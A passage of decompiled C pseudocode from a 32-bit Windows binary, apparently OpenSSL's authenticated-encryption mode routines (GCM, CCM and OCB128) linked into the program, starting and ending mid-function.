      while ( a4 );
    }
  }
  *(_DWORD *)(a1 + 360) = v9;
  return 0;
}
// 40C55B: conditional instruction was optimized away because ebx.4!=0

//----- (0040C6A0) --------------------------------------------------------
int __cdecl sub_40C6A0(
        int a1,
        char *a2,
        _BYTE *a3,
        unsigned int a4,
        void (__cdecl *a5)(char *, _BYTE *, int, int, int))
{
  void (__cdecl *v6)(int, int); // edx
  unsigned __int64 v7; // kr00_8
  bool v8; // zf
  int v9; // ebx
  char v12; // al
  unsigned int v13; // edx
  _BYTE *v14; // eax
  int v15; // edi
  char v16; // cl
  char v17; // dl
  int v19; // [esp+4h] [ebp-10h]
  void (__cdecl *v20)(int, int); // [esp+8h] [ebp-Ch]
  unsigned int v21; // [esp+8h] [ebp-Ch]
  unsigned int v22; // [esp+8h] [ebp-Ch]
  void (__cdecl *v23)(int, int, char *, int); // [esp+Ch] [ebp-8h]
  unsigned int v24; // [esp+10h] [ebp-4h]
  unsigned int v25; // [esp+18h] [ebp+4h]

  v6 = *(void (__cdecl **)(int, int))(a1 + 352);
  v23 = *(void (__cdecl **)(int, int, char *, int))(a1 + 356);
  v19 = *(_DWORD *)(a1 + 372);
  v20 = v6;
  v7 = a4 + *(_QWORD *)(a1 + 56);
  if ( v7 > 0xFFFFFFFE0i64 )
    return -1;
  v8 = *(_DWORD *)(a1 + 364) == 0;
  *(_QWORD *)(a1 + 56) = v7;
  if ( !v8 )
  {
    v6(a1 + 64, a1 + 96);
    *(_DWORD *)(a1 + 364) = 0;
  }
  v9 = *(_DWORD *)(a1 + 360);
  v25 = _byteswap_ulong(*(_DWORD *)(a1 + 12));
  if ( v9 )
  {
    while ( a4 )
    {
      v12 = *a2;
      --a4;
      *a3 = *a2 ^ *(_BYTE *)(v9 + a1 + 16);
      *(_BYTE *)(v9 + a1 + 64) ^= v12;
      ++a2;
      ++a3;
      v9 = ((_BYTE)v9 + 1) & 0xF;
      if ( !v9 )
      {
        v20(a1 + 64, a1 + 96);
        goto LABEL_9;
      }
    }
  }
  else
  {
LABEL_9:
    v13 = a4;
    if ( a4 >= 0xC00 )
    {
      v21 = a4 / 0xC00;
      do
      {
        v23(a1 + 64, a1 + 96, a2, 3072);
        a5(a2, a3, 192, v19, a1);
        a4 -= 3072;
        v25 += 192;
        a3 += 3072;
        a2 += 3072;
        v8 = v21-- == 1;
        *(_DWORD *)(a1 + 12) = _byteswap_ulong(v25);
      }
      while ( !v8 );
      v13 = a4;
    }
    v24 = v13 & 0xFFFFFFF0;
    if ( (v13 & 0xFFFFFFF0) != 0 )
    {
      v22 = (v13 & 0xFFFFFFF0) >> 4;
      v23(a1 + 64, a1 + 96, a2, v13 & 0xFFFFFFF0);
      a5(a2, a3, v22, v19, a1);
      v25 += v22;
      *(_DWORD *)(a1 + 12) = _byteswap_ulong(v25);
      a3 += v24;
      a2 += v24;
      a4 -= v24;
      v13 = a4;
    }
    if ( v13 )
    {
      (*(void (__cdecl **)(int, int, int))(a1 + 368))(a1, a1 + 16, v19);
      *(_DWORD *)(a1 + 12) = _byteswap_ulong(v25 + 1);
      v14 = &a3[v9];
      v15 = a2 - a3;
      do
      {
        v16 = v14[v15];
        v17 = *(_BYTE *)(a1 + v9 + 16);
        *(_BYTE *)(a1 + v9 + 64) ^= v16;
        *v14 = v16 ^ v17;
        ++v9;
        ++v14;
        --a4;
      }
      while ( a4 );
    }
  }
  *(_DWORD *)(a1 + 360) = v9;
  return 0;
}
// 40C757: conditional instruction was optimized away because ebx.4!=0

//----- (0040C8A0) --------------------------------------------------------
int __cdecl sub_40C8A0(int a1, _BYTE *a2, unsigned int a3)
{
  void (__cdecl *v4)(_DWORD, _DWORD); // edx
  unsigned int v5; // eax
  unsigned int v6; // ebp
  unsigned int v7; // edi
  unsigned int v8; // ebx
  bool v9; // zf
  int v10; // eax
  int v11; // ecx
  unsigned int v13; // [esp+14h] [ebp-4h]
  void (__cdecl *v14)(_DWORD, _DWORD); // [esp+1Ch] [ebp+4h]

  v4 = *(void (__cdecl **)(_DWORD, _DWORD))(a1 + 352);
  v5 = *(_QWORD *)(a1 + 56) >> 29;
  v6 = *(_QWORD *)(a1 + 48) >> 29;
  v7 = 8 * *(_DWORD *)(a1 + 48);
  v8 = 8 * *(_DWORD *)(a1 + 56);
  v9 = *(_DWORD *)(a1 + 360) == 0;
  v13 = v5;
  v14 = v4;
  if ( !v9 || *(_DWORD *)(a1 + 364) )
  {
    v4(a1 + 64, a1 + 96);
    v4 = v14;
    v5 = v13;
  }
  *(_DWORD *)(a1 + 72) ^= _byteswap_ulong(v5);
  *(_DWORD *)(a1 + 68) ^= _byteswap_ulong(v7);
  *(_DWORD *)(a1 + 64) ^= _byteswap_ulong(v6);
  *(_DWORD *)(a1 + 76) ^= _byteswap_ulong(v8);
  v4(a1 + 64, a1 + 96);
  v10 = *(_DWORD *)(a1 + 40);
  *(_DWORD *)(a1 + 64) ^= *(_DWORD *)(a1 + 32);
  *(_DWORD *)(a1 + 72) ^= v10;
  v11 = *(_DWORD *)(a1 + 44);
  *(_DWORD *)(a1 + 68) ^= *(_DWORD *)(a1 + 36);
  *(_DWORD *)(a1 + 76) ^= v11;
  if ( a2 && a3 <= 0x10 )
    return sub_413A50((char *)(a1 + 64), a2, a3);
  else
    return -1;
}

//----- (0040C970) --------------------------------------------------------
void *__cdecl sub_40C970(int a1, void *a2, size_t Size)
{
  size_t v3; // eax

  sub_40C8A0(a1, 0, 0);
  v3 = Size;
  if ( Size > 0x10 )
    v3 = 16;
  return memcpy(a2, (const void *)(a1 + 64), v3);
}

//----- (0040C9B0) --------------------------------------------------------
_DWORD *__cdecl sub_40C9B0(_DWORD *a1, int a2, char a3, int a4, int a5)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = 0;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  *(_BYTE *)a1 = (a3 - 1) & 7 | (8 * (((unsigned int)(a2 - 2) >> 1) & 7));
  a1[8] = 0;
  a1[9] = 0;
  a1[10] = a5;
  a1[11] = a4;
  return result;
}

//----- (0040CA00) --------------------------------------------------------
int __cdecl sub_40CA00(char *a1, void *Src, unsigned int a3, int a4)
{
  char v4; // cl
  size_t v5; // esi

  v4 = *a1;
  v5 = 14 - (*a1 & 7);
  if ( a3 < v5 )
    return -1;
  *((_DWORD *)a1 + 3) = 0;
  *((_DWORD *)a1 + 2) = 0;
  a1[12] = HIBYTE(a4);
  a1[13] = BYTE2(a4);
  *a1 = v4 & 0xBF;
  a1[14] = BYTE1(a4);
  a1[15] = a4;
  memcpy(a1 + 1, Src, v5);
  return 0;
}

//----- (0040CA70) --------------------------------------------------------
unsigned int __cdecl sub_40CA70(int a1, _BYTE *a2, unsigned int a3)
{
  unsigned int v3; // ebx
  unsigned int result; // eax
  int v6; // ecx
  char *v7; // edi
  bool v8; // cf
  char v9; // al
  void (__cdecl *v11)(int, int, _DWORD); // [esp+Ch] [ebp+4h]

  v3 = a3;
  result = *(_DWORD *)(a1 + 40);
  v11 = (void (__cdecl *)(int, int, _DWORD))result;
  if ( a3 )
  {
    v6 = *(_DWORD *)(a1 + 44);
    *(_BYTE *)a1 |= 0x40u;
    v7 = (char *)(a1 + 16);
    ((void (__cdecl *)(int, int, int))result)(a1, a1 + 16, v6);
    v8 = __CFADD__((*(_DWORD *)(a1 + 32))++, 1);
    *(_DWORD *)(a1 + 36) += v8;
    if ( a3 >= 0xFF00 )
    {
      v9 = *v7;
      *(_BYTE *)(a1 + 17) ^= 0xFEu;
      *v7 = ~v9;
      *(_BYTE *)(a1 + 20) ^= BYTE1(a3);
      *(_BYTE *)(a1 + 18) ^= HIBYTE(a3);
      *(_BYTE *)(a1 + 19) ^= BYTE2(a3);
      *(_BYTE *)(a1 + 21) ^= a3;
      result = 6;
    }
    else
    {
      *v7 ^= BYTE1(a3);
      *(_BYTE *)(a1 + 17) ^= a3;
      result = 2;
    }
    do
    {
      do
      {
        if ( !v3 )
          break;
        v7[result++] ^= *a2++;
        --v3;
      }
      while ( result < 0x10 );
      v11(a1 + 16, a1 + 16, *(_DWORD *)(a1 + 44));
      v8 = __CFADD__((*(_DWORD *)(a1 + 32))++, 1);
      result = 0;
      *(_DWORD *)(a1 + 36) += v8;
    }
    while ( v3 );
  }
  return result;
}
// 40CAF3: conditional instruction was optimized away because eax.4 is in (==0|==2|==6)

//----- (0040CB30) --------------------------------------------------------
int __cdecl sub_40CB30(char *a1, _DWORD *a2, int *a3, unsigned int a4)
{
  char v4; // bl
  int v5; // eax
  unsigned int v6; // edx
  unsigned int v7; // eax
  int v8; // ecx
  int v9; // edi
  unsigned int v10; // ebx
  int v11; // ecx
  int v14; // eax
  char v15; // cl
  int v16; // edx
  int v17; // ecx
  int v18; // edx
  bool v19; // zf
  unsigned int j; // eax
  unsigned int v21; // ecx
  int v22; // edi
  _BYTE *v23; // eax
  int v24; // eax
  char v25; // [esp+Fh] [ebp-29h]
  int v26; // [esp+10h] [ebp-28h]
  void (__cdecl *v27)(char *, char *, int); // [esp+14h] [ebp-24h]
  unsigned int i; // [esp+1Ch] [ebp-1Ch]
  unsigned int v30; // [esp+20h] [ebp-18h]
  int v31; // [esp+24h] [ebp-14h] BYREF
  int v32; // [esp+28h] [ebp-10h]
  int v33; // [esp+2Ch] [ebp-Ch]
  int v34; // [esp+30h] [ebp-8h]

  v4 = *a1;
  v25 = *a1;
  v27 = (void (__cdecl *)(char *, char *, int))*((_DWORD *)a1 + 10);
  v26 = *((_DWORD *)a1 + 11);
  if ( (*a1 & 0x40) == 0 )
  {
    (*((void (__cdecl **)(char *, char *, _DWORD))a1 + 10))(a1, a1 + 16, *((_DWORD *)a1 + 11));
    ++*((_QWORD *)a1 + 4);
  }
  v5 = v4 & 7;
  v6 = 15 - v5;
  *a1 = v5;
  v7 = v6;
  v8 = 0;
  for ( i = v6; v7 < 0xF; v8 = (v9 | v8) << 8 )
  {
    v9 = (unsigned __int8)a1[v7];
    a1[v7++] = 0;
  }
  v10 = a4;
  v11 = (unsigned __int8)a1[15] | v8;
  a1[15] = 1;
  if ( v11 != a4 )
    return -1;
  *((_QWORD *)a1 + 4) += ((a4 + 15) | 8) >> 3;
  if ( *((_QWORD *)a1 + 4) > 0x2000000000000000ui64 )
    return -2;
  if ( a4 >= 0x10 )
  {
    v30 = a4 >> 4;
    do
    {
      *((_DWORD *)a1 + 4) ^= *a2;
      *((_DWORD *)a1 + 5) ^= a2[1];
      *((_DWORD *)a1 + 6) ^= a2[2];
      *((_DWORD *)a1 + 7) ^= a2[3];
      v27(a1 + 16, a1 + 16, v26);
      v27(a1, (char *)&v31, v26);
      v14 = 8;
      do
      {
        v15 = a1[v14 + 7];
        a1[--v14 + 8] = v15 + 1;
      }
      while ( v15 == -1 && v14 );
      v16 = v32 ^ a2[1];
      *a3 = v31 ^ *a2;
      v17 = v33;
      a3[1] = v16;
      v18 = a2[3] ^ v34;
      a3[2] = a2[2] ^ v17;
      a3[3] = v18;
      a2 += 4;
      v10 -= 16;
      v19 = v30-- == 1;
      a3 += 4;
    }
    while ( !v19 );
    v6 = i;
  }
  if ( v10 )
  {
    for ( j = 0; j < v10; ++j )
      a1[j + 16] ^= *((_BYTE *)a2 + j);
    v27(a1 + 16, a1 + 16, v26);
    v27(a1, (char *)&v31, v26);
    v21 = 0;
    v22 = (char *)a2 - (char *)&v31;
    do
    {
      v23 = (char *)&v31 + v21++;
      v23[(char *)a3 - (char *)&v31] = *v23 ^ v23[v22];
    }
    while ( v21 < v10 );
    v6 = i;
  }
  if ( v6 < 0x10 )
    memset(&a1[v6], 0, 16 - v6);
  v27(a1, (char *)&v31, v26);
  *((_DWORD *)a1 + 4) ^= v31;
  *((_DWORD *)a1 + 5) ^= v32;
  v24 = v33;
  *((_DWORD *)a1 + 7) ^= v34;
  *((_DWORD *)a1 + 6) ^= v24;
  *a1 = v25;
  return 0;
}
// 40CD02: conditional instruction was optimized away because ebx.4!=0

//----- (0040CD90) --------------------------------------------------------
int __cdecl sub_40CD90(char *a1, char *a2, int *a3, unsigned int a4)
{
  char v4; // bl
  int v6; // eax
  unsigned int v7; // edx
  unsigned int v8; // eax
  int v9; // ecx
  int v10; // ebx
  int v11; // ecx
  unsigned int v12; // eax
  int v15; // eax
  char v16; // cl
  int v17; // eax
  int v18; // ecx
  int v19; // ecx
  unsigned int v20; // eax
  int v21; // ebx
  int v22; // edi
  _BYTE *v23; // edx
  char v24; // cl
  int v25; // eax
  char v26; // [esp+Fh] [ebp-25h]
  void (__cdecl *v27)(char *, int *, int); // [esp+10h] [ebp-24h]
  int v28; // [esp+14h] [ebp-20h]
  unsigned int v29; // [esp+18h] [ebp-1Ch]
  unsigned int i; // [esp+1Ch] [ebp-18h]
  int v31; // [esp+20h] [ebp-14h] BYREF
  int v32; // [esp+24h] [ebp-10h]
  int v33; // [esp+28h] [ebp-Ch]
  int v34; // [esp+2Ch] [ebp-8h]

  v4 = *a1;
  v26 = *a1;
  v27 = (void (__cdecl *)(char *, int *, int))*((_DWORD *)a1 + 10);
  v28 = *((_DWORD *)a1 + 11);
  if ( (*a1 & 0x40) == 0 )
    (*((void (__cdecl **)(char *, char *, _DWORD))a1 + 10))(a1, a1 + 16, *((_DWORD *)a1 + 11));
  v6 = v4 & 7;
  v7 = 15 - v6;
  *a1 = v6;
  v8 = v7;
  v9 = 0;
  for ( i = v7; v8 < 0xF; v9 = (v10 | v9) << 8 )
  {
    v10 = (unsigned __int8)a1[v8];
    a1[v8++] = 0;
  }
  v11 = (unsigned __int8)a1[15] | v9;
  v12 = a4;
  a1[15] = 1;
  if ( v11 != a4 )
    return -1;
  if ( a4 >= 0x10 )
  {
    v29 = a4 >> 4;
    do
    {
      v27(a1, &v31, v28);
      v15 = 8;
      do
      {
        v16 = a1[v15 + 7];
        a1[--v15 + 8] = v16 + 1;
      }
      while ( v16 == -1 && v15 );
      v17 = v31 ^ *(_DWORD *)a2;
      v18 = v32 ^ *((_DWORD *)a2 + 1);
      *a3 = v17;
      a3[1] = v18;
      *((_DWORD *)a1 + 4) ^= v17;
      *((_DWORD *)a1 + 5) ^= a3[1];
      v19 = v33 ^ *((_DWORD *)a2 + 2);
      a3[3] = v34 ^ *((_DWORD *)a2 + 3);
      a3[2] = v19;
      *((_DWORD *)a1 + 6) ^= v19;
      *((_DWORD *)a1 + 7) ^= a3[3];
      v27(a1 + 16, (int *)a1 + 4, v28);
      a4 -= 16;
      a2 += 16;
      a3 += 4;
      --v29;
    }
    while ( v29 );
    v7 = i;
    v12 = a4;
  }
  if ( v12 )
  {
    v27(a1, &v31, v28);
    v20 = 0;
    if ( a4 )
    {
      v21 = a2 - (char *)&v31;
      v22 = (char *)a3 - (char *)&v31;
      do
      {
        v23 = (char *)&v31 + v20;
        v24 = *v23 ^ v23[v21];
        ++v20;
        v23[v22] = v24;
        a1[v20 + 15] ^= v24;
      }
      while ( v20 < a4 );
    }
    v27(a1 + 16, (int *)a1 + 4, v28);
    v7 = i;
  }
  if ( v7 < 0x10 )
    memset(&a1[v7], 0, 16 - v7);
  v27(a1, &v31, v28);
  *((_DWORD *)a1 + 4) ^= v31;
  *((_DWORD *)a1 + 5) ^= v32;
  v25 = v33;
  *((_DWORD *)a1 + 7) ^= v34;
  *((_DWORD *)a1 + 6) ^= v25;
  *a1 = v26;
  return 0;
}

//----- (0040CFA0) --------------------------------------------------------
__int64 __usercall sub_40CFA0@<edx:eax>(__int64 result@<edx:eax>, int a2@<ecx>)
{
  int v3; // ecx
  int v4; // esi
  int v5; // ebx

  v3 = 8;
  LODWORD(result) = 0;
  v4 = a2 + 8;
  do
  {
    v5 = *(unsigned __int8 *)(v3 + v4 - 1);
    --v3;
    LODWORD(result) = result + v5 + BYTE4(result);
    *(_BYTE *)(v3 + v4) = result;
    LODWORD(result) = (unsigned int)result >> 8;
    HIDWORD(result) >>= 8;
  }
  while ( v3 && result );
  return result;
}

//----- (0040CFE0) --------------------------------------------------------
int __cdecl sub_40CFE0(
        int a1,
        int a2,
        int a3,
        unsigned int a4,
        int (__cdecl *a5)(int, int, unsigned int, int, int, int))
{
  int v5; // ebx
  char v6; // al
  int v7; // eax
  unsigned int v8; // edx
  unsigned int v9; // eax
  int v10; // ecx
  int v11; // edi
  unsigned int v12; // edi
  int v13; // ecx
  __int64 v15; // rax
  int v16; // ebp
  unsigned int j; // eax
  unsigned int k; // ecx
  _BYTE *v19; // eax
  int v20; // eax
  char v21; // [esp+Fh] [ebp-29h]
  int v22; // [esp+10h] [ebp-28h]
  unsigned int i; // [esp+14h] [ebp-24h]
  int v24; // [esp+18h] [ebp-20h]
  void (__cdecl *v25)(int, int, int); // [esp+1Ch] [ebp-1Ch]
  int v26[4]; // [esp+24h] [ebp-14h] BYREF

  v5 = a2;
  v24 = a3;
  v6 = *(_BYTE *)a1;
  v21 = *(_BYTE *)a1;
  v25 = *(void (__cdecl **)(int, int, int))(a1 + 40);
  v22 = *(_DWORD *)(a1 + 44);
  if ( (*(_BYTE *)a1 & 0x40) == 0 )
  {
    (*(void (__cdecl **)(int, int, _DWORD))(a1 + 40))(a1, a1 + 16, *(_DWORD *)(a1 + 44));
    v6 = v21;
    ++*(_QWORD *)(a1 + 32);
  }
  v7 = v6 & 7;
  v8 = 15 - v7;
  *(_BYTE *)a1 = v7;
  v9 = v8;
  v10 = 0;
  for ( i = v8; v9 < 0xF; v10 = (v11 | v10) << 8 )
  {
    v11 = *(unsigned __int8 *)(a1 + v9);
    *(_BYTE *)(a1 + v9++) = 0;
  }
  v12 = a4;
  v13 = *(unsigned __int8 *)(a1 + 15) | v10;
  *(_BYTE *)(a1 + 15) = 1;
  if ( v13 != a4 )
    return -1;
  *(_QWORD *)(a1 + 32) += ((a4 + 15) | 8) >> 3;
  if ( *(_QWORD *)(a1 + 32) > 0x2000000000000000ui64 )
    return -2;
  if ( a4 >> 4 )
  {
    LODWORD(v15) = a5(a2, a3, a4 >> 4, v22, a1, a1 + 16);
    v16 = 16 * (a4 >> 4);
    v24 = v16 + a3;
    v5 = v16 + a2;
    v12 = a4 - v16;
    if ( a4 == v16 )
    {
LABEL_17:
      v8 = i;
      goto LABEL_18;
    }
    HIDWORD(v15) = a4 >> 4;
    sub_40CFA0(v15, a1);
    v8 = i;
  }
  if ( v12 )
  {
    for ( j = 0; j < v12; ++j )
      *(_BYTE *)(a1 + j + 16) ^= *(_BYTE *)(v5 + j);
    v25(a1 + 16, a1 + 16, v22);
    v25(a1, (int)v26, v22);
    for ( k = 0; k < v12; ++k )
    {
      v19 = (char *)v26 + k;
      v19[v24 - (_DWORD)v26] = *v19 ^ v19[v5 - (_DWORD)v26];
    }
    goto LABEL_17;
  }
LABEL_18:
  if ( v8 < 0x10 )
    memset((void *)(a1 + v8), 0, 16 - v8);
  v25(a1, (int)v26, v22);
  *(_DWORD *)(a1 + 16) ^= v26[0];
  *(_DWORD *)(a1 + 20) ^= v26[1];
  v20 = v26[2];
  *(_DWORD *)(a1 + 28) ^= v26[3];
  *(_DWORD *)(a1 + 24) ^= v20;
  *(_BYTE *)a1 = v21;
  return 0;
}
// 40D150: conditional instruction was optimized away because edi.4!=0

//----- (0040D1E0) --------------------------------------------------------
int __cdecl sub_40D1E0(
        int a1,
        int a2,
        int a3,
        unsigned int a4,
        int (__cdecl *a5)(int, int, unsigned int, int, int, int))
{
  char v5; // bl
  int v6; // eax
  unsigned int v7; // ebx
  unsigned int v8; // eax
  int i; // ecx
  int v10; // edx
  unsigned int v11; // ebp
  int v12; // ecx
  __int64 v14; // rax
  unsigned int j; // eax
  _BYTE *v16; // edx
  char v17; // cl
  int v18; // edx
  char v19; // [esp+Fh] [ebp-2Dh]
  int v20; // [esp+10h] [ebp-2Ch]
  int v21; // [esp+14h] [ebp-28h]
  int v22; // [esp+18h] [ebp-24h]
  void (__cdecl *v23)(int, int *, int); // [esp+1Ch] [ebp-20h]
  int v24[4]; // [esp+28h] [ebp-14h] BYREF

  v5 = *(_BYTE *)a1;
  v22 = a2;
  v21 = a3;
  v19 = *(_BYTE *)a1;
  v23 = *(void (__cdecl **)(int, int *, int))(a1 + 40);
  v20 = *(_DWORD *)(a1 + 44);
  if ( (*(_BYTE *)a1 & 0x40) == 0 )
    (*(void (__cdecl **)(int, int, _DWORD))(a1 + 40))(a1, a1 + 16, *(_DWORD *)(a1 + 44));
  v6 = v5 & 7;
  v7 = 15 - v6;
  *(_BYTE *)a1 = v6;
  v8 = v7;
  for ( i = 0; v8 < 0xF; i = (v10 | i) << 8 )
  {
    v10 = *(unsigned __int8 *)(a1 + v8);
    *(_BYTE *)(a1 + v8++) = 0;
  }
  v11 = a4;
  v12 = *(unsigned __int8 *)(a1 + 15) | i;
  *(_BYTE *)(a1 + 15) = 1;
  if ( v12 != a4 )
    return -1;
  if ( !(a4 >> 4) )
    goto LABEL_10;
  LODWORD(v14) = a5(a2, a3, a4 >> 4, v20, a1, a1 + 16);
  HIDWORD(v14) = 16 * (a4 >> 4);
  v22 = HIDWORD(v14) + a2;
  v21 = HIDWORD(v14) + a3;
  v11 = a4 - HIDWORD(v14);
  if ( a4 != HIDWORD(v14) )
  {
    HIDWORD(v14) = a4 >> 4;
    sub_40CFA0(v14, a1);
LABEL_10:
    if ( v11 )
    {
      v23(a1, v24, v20);
      for ( j = 0; j < v11; *(_BYTE *)(a1 + j + 15) ^= v17 )
      {
        v16 = (char *)v24 + j;
        v17 = *v16 ^ v16[v22 - (_DWORD)v24];
        ++j;
        v16[v21 - (_DWORD)v24] = v17;
      }
      v23(a1 + 16, (int *)(a1 + 16), v20);
    }
  }
  if ( v7 < 0x10 )
    memset((void *)(a1 + v7), 0, 16 - v7);
  v23(a1, v24, v20);
  v18 = v24[0];
  *(_DWORD *)(a1 + 20) ^= v24[1];
  *(_DWORD *)(a1 + 16) ^= v18;
  *(_DWORD *)(a1 + 24) ^= v24[2];
  *(_DWORD *)(a1 + 28) ^= v24[3];
  *(_BYTE *)a1 = v19;
  return 0;
}
// 40D2E9: conditional instruction was optimized away because ebp.4!=0

//----- (0040D390) --------------------------------------------------------
unsigned int __cdecl sub_40D390(unsigned __int8 *a1, void *a2, unsigned int a3)
{
  unsigned int v3; // esi

  v3 = 2 * ((*a1 >> 3) & 7) + 2;
  if ( a3 < v3 )
    return 0;
  memcpy(a2, a1 + 16, 2 * ((*a1 >> 3) & 7) + 2);
  return v3;
}

//----- (0040D3D0) --------------------------------------------------------
_BYTE *__usercall sub_40D3D0@<eax>(int a1@<edx>, char a2@<bl>, int a3@<edi>)
{
  int v3; // esi
  _BYTE *result; // eax
  bool v5; // cc
  char v6; // dl
  _BYTE *v7; // ebp
  char v8; // dl
  char v9; // dl
  char v10; // dl
  char v11; // [esp+2h] [ebp-2Ah]
  char v12; // [esp+3h] [ebp-29h]
  int v13; // [esp+4h] [ebp-28h]
  char *v14; // [esp+8h] [ebp-24h]
  int v15; // [esp+Ch] [ebp-20h]
  int v16; // [esp+10h] [ebp-1Ch]
  int v17; // [esp+14h] [ebp-18h]
  char v18[16]; // [esp+18h] [ebp-14h] BYREF

  v11 = 8 - a2;
  v14 = &v18[-a1];
  v13 = a3 - a1;
  v17 = -1 - a1;
  v15 = -2 - a1;
  v3 = 15;
  v12 = -1 << (8 - a2);
  result = (_BYTE *)(a1 + 15);
  v16 = -3 - a1;
  v5 = 0;
  do
  {
    if ( !v5 )
      v18[v3 - 1] = (unsigned __int8)(v12 & *result) >> v11;
    v6 = *result << a2;
    result[v13] = v6;
    if ( v3 != 15 )
      result[v13] = v6 ^ result[(_DWORD)v14];
    v7 = &result[v17];
    if ( (int)&result[v17] > 0 )
      v18[v3 - 2] = (unsigned __int8)(v12 & *(result - 1)) >> v11;
    v8 = *(result - 1) << a2;
    *(_BYTE *)(a3 + v3 - 1) = v8;
    if ( v7 != (_BYTE *)15 )
      *(_BYTE *)(a3 + v3 - 1) = v8 ^ v18[v3 - 1];
    if ( (int)&result[v15] > 0 )
      v18[v3 - 3] = (unsigned __int8)(v12 & *(result - 2)) >> v11;
    v9 = *(result - 2) << a2;
    *(_BYTE *)(a3 + v3 - 2) = v9;
    if ( &result[v15] != (_BYTE *)15 )
      *(_BYTE *)(a3 + v3 - 2) = v9 ^ v18[v3 - 2];
    if ( (int)&result[v16] > 0 )
      v18[v3 - 4] = (unsigned __int8)(v12 & *(result - 3)) >> v11;
    v10 = *(result - 3) << a2;
    *(_BYTE *)(a3 + v3 - 3) = v10;
    if ( &result[v16] != (_BYTE *)15 )
      *(_BYTE *)(a3 + v3 - 3) = v10 ^ v18[v3 - 3];
    v3 -= 4;
    result -= 4;
    v5 = v3 <= 0;
  }
  while ( v3 >= 0 );
  return result;
}
// 40D3D0: using guessed type char var_14[16];

//----- (0040D530) --------------------------------------------------------
void *__cdecl sub_40D530(_DWORD *a1, unsigned int a2)
{
  unsigned int v3; // ebx
  unsigned int v4; // edi
  unsigned int v5; // eax
  void *v6; // edx
  unsigned int v7; // eax
  void *result; // eax
  int v9; // esi
  _BYTE *v10; // edx
  _BYTE *v11; // edi
  unsigned int v12; // [esp+Ch] [ebp-8h]
  char v13; // [esp+18h] [ebp+4h]

  v3 = a1[5];
  v4 = a2;
  if ( a2 > v3 )
  {
    v5 = a1[6];
    if ( a2 >= v5 )
    {
      v6 = (void *)a1[16];
      v7 = ((a2 - v5 + 4) & 0xFFFFFFFC) + v5;
      a1[6] = v7;
      result = sub_413500(v6, 16 * v7, (int)"crypto\\modes\\ocb128.c", 122);
      if ( !result )
        return result;
      a1[16] = result;
    }
    if ( v3 < a2 )
    {
      v9 = 16 * v3;
      v12 = a2 - v3;
      do
      {
        v10 = (_BYTE *)(v9 + a1[16]);
        v11 = v10 + 16;
        v13 = -121 * (*v10 >> 7);
        sub_40D3D0((int)v10, 1, (int)(v10 + 16));
        v11[15] ^= v13;
        v9 += 16;
        --v12;
      }
      while ( v12 );
      v3 = a2;
      v4 = a2;
    }
    a1[5] = v3;
  }
  return (void *)(a1[16] + 16 * v4);
}

//----- (0040D5F0) --------------------------------------------------------
int __cdecl sub_40D5F0(int *a1, int a2, int a3, void (__cdecl *a4)(int *, int *, int), int a5, int a6)
{
  int result; // eax
  int v8; // edi
  _BYTE *v9; // edx
  _BYTE *v10; // edi
  int v11; // eax
  int v12; // edi
  int v13; // eax
  int v14; // edi
  int v15; // eax
  int v16; // edi
  char v17; // [esp+8h] [ebp+4h]
  char v18; // [esp+8h] [ebp+4h]
  char v19; // [esp+8h] [ebp+4h]
  char v20; // [esp+8h] [ebp+4h]
  char v21; // [esp+8h] [ebp+4h]
  char v22; // [esp+8h] [ebp+4h]

  memset(a1, 0, 0xA8u);
  a1[5] = 0;
  a1[6] = 5;
  result = (int)sub_4133F0(0x50u);
  a1[16] = result;
  if ( result )
  {
    a1[1] = a5;
    a1[4] = a6;
    *a1 = (int)a4;
    a1[2] = a2;
    a1[3] = a3;
    a4(a1 + 8, a1 + 8, a2);
    v17 = -121 * (*((_BYTE *)a1 + 32) >> 7);
    sub_40D3D0((int)(a1 + 8), 1, (int)(a1 + 12));
    *((_BYTE *)a1 + 63) ^= v17;
    v8 = a1[16];
    v18 = -121 * (*((_BYTE *)a1 + 48) >> 7);
    sub_40D3D0((int)(a1 + 12), 1, v8);
    *(_BYTE *)(v8 + 15) ^= v18;
    v9 = (_BYTE *)a1[16];
    v10 = v9 + 16;
    v19 = -121 * (*v9 >> 7);
    sub_40D3D0((int)v9, 1, (int)(v9 + 16));
    v10[15] ^= v19;
    v11 = a1[16];
    v12 = v11 + 32;
    v20 = -121 * (*(_BYTE *)(v11 + 16) >> 7);
    sub_40D3D0(v11 + 16, 1, v11 + 32);
    *(_BYTE *)(v12 + 15) ^= v20;
    v13 = a1[16];
    v14 = v13 + 48;
    v21 = -121 * (*(_BYTE *)(v13 + 32) >> 7);
    sub_40D3D0(v13 + 32, 1, v13 + 48);
    *(_BYTE *)(v14 + 15) ^= v21;
    v15 = a1[16];
    v16 = v15 + 64;
    v22 = -121 * (*(_BYTE *)(v15 + 48) >> 7);
    sub_40D3D0(v15 + 48, 1, v15 + 64);
    *(_BYTE *)(v16 + 15) ^= v22;
    result = 1;
    a1[5] = 4;
  }
  return result;
}

//----- (0040D750) --------------------------------------------------------
int __cdecl sub_40D750(_DWORD *a1, int a2, int a3, int a4)
{
  int result; // eax

  qmemcpy(a1, (const void *)a2, 0xA8u);
  if ( a3 )
    a1[2] = a3;
  if ( a4 )
    a1[3] = a4;
  if ( *(_DWORD *)(a2 + 64) )
  {
    result = (int)sub_4133F0(16 * *(_DWORD *)(a2 + 24));
    a1[16] = result;
    if ( !result )
      return result;
    memcpy((void *)result, *(const void **)(a2 + 64), 16 * (*(_DWORD *)(a2 + 20) + 1));
  }
  return 1;
}

//----- (0040D7D0) --------------------------------------------------------
int __cdecl sub_40D7D0(int a1, void *Src, size_t Size, int a4)
{
  void (__cdecl *v4)(int *, __int64 *, int); // ecx
  char v5; // bl
  int v6; // ebp
  int v8; // [esp-18h] [ebp-6Ch]
  int v9; // [esp+14h] [ebp-40h]
  __int64 v10; // [esp+18h] [ebp-3Ch] BYREF
  int v11; // [esp+20h] [ebp-34h]
  int v12; // [esp+24h] [ebp-30h]
  __int64 v13; // [esp+28h] [ebp-2Ch] BYREF
  int v14; // [esp+30h] [ebp-24h]
  int v15; // [esp+34h] [ebp-20h]
  char v16; // [esp+38h] [ebp-1Ch]
  int v17; // [esp+39h] [ebp-1Bh]
  __int16 v18; // [esp+3Dh] [ebp-17h]
  char v19; // [esp+3Fh] [ebp-15h]
  int v20; // [esp+40h] [ebp-14h] BYREF
  __int64 v21; // [esp+44h] [ebp-10h]
  int v22; // [esp+4Ch] [ebp-8h]

